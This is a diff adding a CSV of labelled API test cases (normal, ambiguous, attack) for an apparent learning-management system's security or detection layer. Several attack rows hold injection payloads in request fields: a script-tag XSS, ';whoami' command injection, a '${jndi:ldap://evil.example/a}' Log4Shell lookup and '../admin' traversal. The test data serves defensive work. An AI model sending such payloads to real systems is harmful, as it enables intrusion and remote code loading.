@@ -1,0 +1,101 @@
+case_id,case_class,request_intent,http_method,request_path,content_type,request_body,auth_scope,capture_var,capture_expr,accepted_codes
+lms_001,normal,student-my-courses,GET,/api/lms/courses/my,,,student,,,200
+lms_002,normal,student-course1-assignments,GET,/api/lms/courses/1/assignments,,,student,,,200|403|404
+lms_003,normal,student-course2-assignments,GET,/api/lms/courses/2/assignments,,,student,,,200|403|404
+lms_004,normal,student-course5-assignments,GET,/api/lms/courses/5/assignments,,,student,,,200|403|404
+lms_005,normal,student-assignment1,GET,/api/lms/assignments/1,,,student,,,200|403|404
+lms_006,normal,student-assignment2,GET,/api/lms/assignments/2,,,student,,,200|403|404
+lms_007,normal,student-assignment3,GET,/api/lms/assignments/3,,,student,,,200|403|404
+lms_008,normal,student-alt-my-courses,GET,/api/lms/courses/my,,,student_alt,,,200
+lms_009,normal,student-alt-course1-assignments,GET,/api/lms/courses/1/assignments,,,student_alt,,,200|403|404
+lms_010,normal,student-alt-course6-assignments,GET,/api/lms/courses/6/assignments,,,student_alt,,,200|403|404
+lms_011,normal,student-alt-course7-assignments,GET,/api/lms/courses/7/assignments,,,student_alt,,,200|403|404
+lms_012,normal,student-alt-assignment1,GET,/api/lms/assignments/1,,,student_alt,,,200|403|404
+lms_013,normal,student-alt-assignment4,GET,/api/lms/assignments/4,,,student_alt,,,200|403|404
+lms_014,normal,student-alt-assignment5,GET,/api/lms/assignments/5,,,student_alt,,,200|403|404
+lms_015,normal,admin-users,GET,/api/lms/admin/users,,,admin,,,200|403
+lms_016,normal,admin-courses,GET,/api/lms/admin/courses,,,admin,,,200|403
+lms_017,normal,admin-enrollments,GET,/api/lms/admin/enrollments,,,admin,,,200|403
+lms_018,normal,admin-overviews,GET,/api/lms/admin/students/overviews,,,admin,,,200|403
+lms_019,normal,prof-assignment1,GET,/api/lms/assignments/1,,,professor,,,200|403|404
+lms_020,normal,prof-assignment4,GET,/api/lms/assignments/4,,,professor,,,200|403|404
+lms_021,normal,student-repeat-courses,GET,/api/lms/courses/my,,,student,,,200
+lms_022,normal,student-course3-assignments,GET,/api/lms/courses/3/assignments,,,student,,,200|403|404
+lms_023,normal,student-repeat-assignment1,GET,/api/lms/assignments/1,,,student,,,200|403|404
+lms_024,normal,student-alt-repeat-courses,GET,/api/lms/courses/my,,,student_alt,,,200
+lms_025,normal,student-alt-repeat-assignment5,GET,/api/lms/assignments/5,,,student_alt,,,200|403|404
+lms_026,normal,admin-repeat-users,GET,/api/lms/admin/users,,,admin,,,200|403
+lms_027,normal,admin-repeat-courses,GET,/api/lms/admin/courses,,,admin,,,200|403
+lms_028,normal,admin-repeat-enrollments,GET,/api/lms/admin/enrollments,,,admin,,,200|403
+lms_029,normal,admin-repeat-overviews,GET,/api/lms/admin/students/overviews,,,admin,,,200|403
+lms_030,normal,prof-assignment2,GET,/api/lms/assignments/2,,,professor,,,200|403|404
+lms_031,normal,prof-assignment3,GET,/api/lms/assignments/3,,,professor,,,200|403|404
+lms_032,normal,prof-assignment5,GET,/api/lms/assignments/5,,,professor,,,200|403|404
+lms_033,normal,lms-student-a-courses,GET,/api/lms/courses/my,,,lms_student_a,,,200
+lms_034,normal,lms-student-a-course1,GET,/api/lms/courses/1/assignments,,,lms_student_a,,,200|403|404
+lms_035,normal,lms-student-a-assignment1,GET,/api/lms/assignments/1,,,lms_student_a,,,200|403|404
+lms_036,normal,admin-create-enrollment-course2,POST,/api/lms/admin/enrollments,application/json,"{""courseId"":2,""studentId"":""${lms_student_d_id}""}",admin,lms_dyn_enroll_1,id,201|400|403|404
+lms_037,normal,admin-list-enrollments-after-create,GET,/api/lms/admin/enrollments,,,admin,,,200|403
+lms_038,normal,admin-delete-enrollment-course2,DELETE,/api/lms/admin/enrollments/${lms_dyn_enroll_1},,,admin,,,204|403|404
+lms_039,normal,admin-create-enrollment-course7,POST,/api/lms/admin/enrollments,application/json,"{""courseId"":7,""studentId"":""${lms_student_d_id}""}",admin,lms_dyn_enroll_2,id,201|400|403|404
+lms_040,normal,admin-delete-enrollment-course7,DELETE,/api/lms/admin/enrollments/${lms_dyn_enroll_2},,,admin,,,204|403|404
+lms_041,normal,submit-assignment1,POST,/api/lms/assignments/1/submissions,application/json,"{""contentText"":""정상 제출 본문 ${__property(mixed500_run_id)} A-1""}",lms_student_a,lms_sub_1,id,201|400|403|404
+lms_042,normal,grade-assignment1,POST,/api/lms/submissions/${lms_sub_1}/grade,application/json,"{""score"":95,""feedback"":""정상 채점 피드백입니다.""}",professor,,,200|400|403|404
+lms_043,ambiguous,submit-assignment2-ambiguous,POST,/api/lms/assignments/2/submissions,application/json,"{""contentText"":""select 문, script 태그, ../admin 예시를 교육용으로 정리한 제출물입니다. ${__property(mixed500_run_id)}""}",lms_student_a,lms_sub_2,id,201|400|403|404
+lms_044,ambiguous,grade-assignment2-ambiguous,POST,/api/lms/submissions/${lms_sub_2}/grade,application/json,"{""score"":88,""feedback"":""select 문과 script 태그 예시는 설명용 문맥으로 보입니다.""}",professor,,,200|400|403|404
+lms_045,normal,submit-assignment3,POST,/api/lms/assignments/3/submissions,application/json,"{""contentText"":""네트워크 보안 로그 분석 과제 제출 ${__property(mixed500_run_id)} B-3""}",lms_student_b,lms_sub_3,id,201|400|403|404
+lms_046,ambiguous,grade-assignment3-ambiguous,POST,/api/lms/submissions/${lms_sub_3}/grade,application/json,"{""score"":90,""feedback"":""alert tcp, cmd.exe, powershell -enc 예시는 교육용 맥락으로 확인했습니다.""}",professor,,,200|400|403|404
+lms_047,ambiguous,submit-assignment4-ambiguous,POST,/api/lms/assignments/4/submissions,application/json,"{""contentText"":""웹보안 사례 조사: XSS payload, LFI 경로, query string 설명 ${__property(mixed500_run_id)} C-4""}",lms_student_c,lms_sub_4,id,201|400|403|404
+lms_048,normal,grade-assignment4-normal,POST,/api/lms/submissions/${lms_sub_4}/grade,application/json,"{""score"":92,""feedback"":""정상 제출이며 분석 구조가 좋습니다.""}",professor,,,200|400|403|404
+lms_049,attack,submit-assignment5-attack,POST,/api/lms/assignments/5/submissions,application/json,"{""contentText"":""<script>alert(1)</script> 와 ;whoami 를 포함한 명확한 공격성 제출 테스트 ${__property(mixed500_run_id)} C-5""}",lms_student_c,lms_sub_5,id,201|400|403|404
+lms_050,attack,grade-assignment5-attack,POST,/api/lms/submissions/${lms_sub_5}/grade,application/json,"{""score"":70,""feedback"":""채점 피드백에 ${jndi:ldap://evil.example/a} 와 ../admin 문자열이 포함된 명확한 공격성 테스트입니다.""}",professor,,,200|400|403|404
+lms_051,attack,student-to-admin-users,GET,/api/lms/admin/users,,,student,,,403
+lms_052,attack,professor-to-admin-courses,GET,/api/lms/admin/courses,,,professor,,,403
+lms_053,attack,lms-student-a-to-admin-enrollments,GET,/api/lms/admin/enrollments,,,lms_student_a,,,403
+lms_054,attack,admin-to-my-courses,GET,/api/lms/courses/my,,,admin,,,403
+lms_055,attack,admin-to-assignment1,GET,/api/lms/assignments/1,,,admin,,,403
+lms_056,attack,lms-student-a-to-assignment3,GET,/api/lms/assignments/3,,,lms_student_a,,,403|404
+lms_057,attack,student-alt-to-assignment3,GET,/api/lms/assignments/3,,,student_alt,,,403|404
+lms_058,attack,student-to-assignment4,GET,/api/lms/assignments/4,,,student,,,403|404
+lms_059,attack,student-to-course6-assignments,GET,/api/lms/courses/6/assignments,,,student,,,403|404
+lms_060,attack,student-alt-to-course5-assignments,GET,/api/lms/courses/5/assignments,,,student_alt,,,403|404
+lms_061,attack,student-assignment-404,GET,/api/lms/assignments/999999,,,student,,,404
+lms_062,attack,prof-assignment-404,GET,/api/lms/assignments/999999,,,professor,,,404
+lms_063,attack,admin-delete-enrollment-404,DELETE,/api/lms/admin/enrollments/999999,,,admin,,,404
+lms_064,attack,prof-grade-missing-404,POST,/api/lms/submissions/999999/grade,application/json,"{""score"":40,""feedback"":""missing submission""}",professor,,,404
+lms_065,attack,student-submit-missing-404,POST,/api/lms/assignments/999999/submissions,application/json,"{""contentText"":""missing assignment""}",student,,,404
+lms_066,ambiguous,regrade-sub1-select,POST,/api/lms/submissions/${lms_sub_1}/grade,application/json,"{""score"":96,""feedback"":""select 문 예시가 포함된 제출물로 보이며 정상 문맥입니다.""}",professor,,,200|400|403|404
+lms_067,ambiguous,regrade-sub2-script,POST,/api/lms/submissions/${lms_sub_2}/grade,application/json,"{""score"":89,""feedback"":""script 태그 예시 설명용 문맥으로 판단됩니다.""}",professor,,,200|400|403|404
+lms_068,ambiguous,regrade-sub3-traversal,POST,/api/lms/submissions/${lms_sub_3}/grade,application/json,"{""score"":91,""feedback"":""../admin 경로는 분석 예시 맥락으로 확인됩니다.""}",professor,,,200|400|403|404
+lms_069,ambiguous,regrade-sub4-command,POST,/api/lms/submissions/${lms_sub_4}/grade,application/json,"{""score"":87,""feedback"":""cmd.exe 와 powershell -enc 문자열은 보고서 예시입니다.""}",professor,,,200|400|403|404
+lms_070,attack,regrade-sub5-script,POST,/api/lms/submissions/${lms_sub_5}/grade,application/json,"{""score"":65,""feedback"":""<script>alert(1)</script> 를 피드백에 재전송하는 공격성 테스트입니다.""}",professor,,,200|400|403|404
+lms_071,normal,student-read-assignment3,GET,/api/lms/assignments/3,,,student,,,200|403|404
+lms_072,normal,student-alt-read-assignment4,GET,/api/lms/assignments/4,,,student_alt,,,200|403|404
+lms_073,normal,lms-student-a-read-assignment1,GET,/api/lms/assignments/1,,,lms_student_a,,,200|403|404
+lms_074,normal,admin-list-enrollments-tail,GET,/api/lms/admin/enrollments,,,admin,,,200|403
+lms_075,normal,admin-overviews-tail,GET,/api/lms/admin/students/overviews,,,admin,,,200|403
+lms_076,normal,prof-read-assignment1,GET,/api/lms/assignments/1,,,professor,,,200|403|404
+lms_077,normal,prof-read-assignment5,GET,/api/lms/assignments/5,,,professor,,,200|403|404
+lms_078,normal,student-tail-courses,GET,/api/lms/courses/my,,,student,,,200
+lms_079,normal,student-alt-tail-courses,GET,/api/lms/courses/my,,,student_alt,,,200
+lms_080,normal,lms-student-a-tail-courses,GET,/api/lms/courses/my,,,lms_student_a,,,200
+lms_081,normal,admin-create-enrollment-course1,POST,/api/lms/admin/enrollments,application/json,"{""courseId"":1,""studentId"":""${lms_student_d_id}""}",admin,lms_dyn_enroll_3,id,201|400|403|404
+lms_082,normal,admin-delete-enrollment-course1,DELETE,/api/lms/admin/enrollments/${lms_dyn_enroll_3},,,admin,,,204|403|404
+lms_083,attack,regrade-sub1-command,POST,/api/lms/submissions/${lms_sub_1}/grade,application/json,"{""score"":80,""feedback"":"";whoami""}",professor,,,200|400|403|404
+lms_084,attack,regrade-sub2-jndi,POST,/api/lms/submissions/${lms_sub_2}/grade,application/json,"{""score"":75,""feedback"":""${jndi:ldap://evil.example/a}""}",professor,,,200|400|403|404
+lms_085,ambiguous,regrade-sub3-alert,POST,/api/lms/submissions/${lms_sub_3}/grade,application/json,"{""score"":93,""feedback"":""alert tcp 룰 설명 문장입니다.""}",professor,,,200|400|403|404
+lms_086,normal,student-read-assignment2,GET,/api/lms/assignments/2,,,student,,,200|403|404
+lms_087,normal,student-alt-read-assignment5,GET,/api/lms/assignments/5,,,student_alt,,,200|403|404
+lms_088,normal,admin-users-tail,GET,/api/lms/admin/users,,,admin,,,200|403
+lms_089,normal,admin-courses-tail,GET,/api/lms/admin/courses,,,admin,,,200|403
+lms_090,normal,admin-enrollments-tail-2,GET,/api/lms/admin/enrollments,,,admin,,,200|403
+lms_091,normal,prof-read-assignment2-tail,GET,/api/lms/assignments/2,,,professor,,,200|403|404
+lms_092,normal,prof-read-assignment3-tail,GET,/api/lms/assignments/3,,,professor,,,200|403|404
+lms_093,normal,student-course1-tail,GET,/api/lms/courses/1/assignments,,,student,,,200|403|404
+lms_094,normal,student-alt-course6-tail,GET,/api/lms/courses/6/assignments,,,student_alt,,,200|403|404
+lms_095,normal,lms-student-a-read-assignment2,GET,/api/lms/assignments/2,,,lms_student_a,,,200|403|404
+lms_096,attack,student-to-overviews,GET,/api/lms/admin/students/overviews,,,student,,,403
+lms_097,attack,student-alt-to-users,GET,/api/lms/admin/users,,,student_alt,,,403
+lms_098,attack,professor-to-enrollments,GET,/api/lms/admin/enrollments,,,professor,,,403
+lms_099,attack,lms-student-a-to-course2,GET,/api/lms/courses/2/assignments,,,lms_student_a,,,403|404
+lms_100,attack,admin-to-my-courses-tail,GET,/api/lms/courses/my,,,admin,,,403
